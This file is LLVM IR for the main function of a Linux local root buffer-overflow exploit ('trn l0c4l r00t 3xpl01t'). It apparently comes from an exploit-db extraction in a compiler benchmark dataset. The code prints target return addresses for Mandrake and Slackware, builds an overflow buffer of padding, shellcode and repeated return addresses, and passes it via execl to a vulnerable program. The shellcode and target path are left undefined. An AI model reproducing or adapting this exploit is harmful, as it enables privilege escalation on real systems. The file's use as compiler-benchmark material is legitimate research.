; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_776.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_776.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [47 x i8] c"{           trn l0c4l r00t 3xpl01t          }\0A\00", align 1
@.str.1 = private unnamed_addr constant [47 x i8] c"{  By ZzagorR - http://www.rootbinbash.com  }\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"{  usage   : %s ret buf                  }\0A\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"{  example : %s 0xbfffff99 142           }\0A\00", align 1
@.str.4 = private unnamed_addr constant [47 x i8] c"{  mandrake   9.2   = 0xbfffff96            }\0A\00", align 1
@.str.5 = private unnamed_addr constant [47 x i8] c"{  slackware 10.0.0 = 0xbfffff98            }\0A\00", align 1
@.str.6 = private unnamed_addr constant [47 x i8] c"{  slackware  9.1.0 = 0xbfffff84            }\0A\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"[BOO  %] %i\0A\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"[RET  %] %x\0A\00", align 1
@caylarbeles = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@NEREDE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1000 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 3
  br i1 %12, label %13, label %28

13:                                               ; preds = %2
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0), i8* %18)
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0), i8* %22)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.5, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.6, i64 0, i64 0))
  %27 = call i32 @exit(i32 1) #3
  unreachable

28:                                               ; preds = %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @strtoul(i8* %31, i32* null, i32 16)
  store i64 %32, i64* %9, align 8
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @atoi(i8* %35)
  store i32 %36, i32* %10, align 4
  %37 = load i32, i32* %10, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0), i32 %37)
  %39 = load i64, i64* %9, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i64 %39)
  %41 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  store i8* %41, i8** %8, align 8
  %42 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %43 = load i8*, i8** @caylarbeles, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = sub nsw i32 256, %44
  %46 = call i32 @memset(i8* %42, i32 65, i32 %45)
  %47 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %48 = getelementptr inbounds i8, i8* %47, i64 256
  %49 = load i8*, i8** @caylarbeles, align 8
  %50 = call i32 @strlen(i8* %49)
  %51 = sext i32 %50 to i64
  %52 = sub i64 0, %51
  %53 = getelementptr inbounds i8, i8* %48, i64 %52
  %54 = load i8*, i8** @caylarbeles, align 8
  %55 = call i32 @sprintf(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %54)
  %56 = load i32, i32* %10, align 4
  store i32 %56, i32* %6, align 4
  br label %57

57:                                               ; preds = %69, %28
  %58 = load i32, i32* %6, align 4
  %59 = load i32, i32* %10, align 4
  %60 = add nsw i32 %59, 4
  %61 = icmp sle i32 %58, %60
  br i1 %61, label %62, label %72

62:                                               ; preds = %57
  %63 = load i64, i64* %9, align 8
  %64 = load i8*, i8** %8, align 8
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = bitcast i8* %67 to i64*
  store i64 %63, i64* %68, align 8
  br label %69

69:                                               ; preds = %62
  %70 = load i32, i32* %6, align 4
  %71 = add nsw i32 %70, 4
  store i32 %71, i32* %6, align 4
  br label %57

72:                                               ; preds = %57
  %73 = load i32, i32* @NEREDE, align 4
  %74 = load i32, i32* @NEREDE, align 4
  %75 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %76 = call i32 @execl(i32 %73, i32 %74, i8* %75, i32* null)
  br label %77

77:                                               ; preds = %72
  %78 = load i32, i32* %3, align 4
  ret i32 %78
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @execl(i32, i32, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
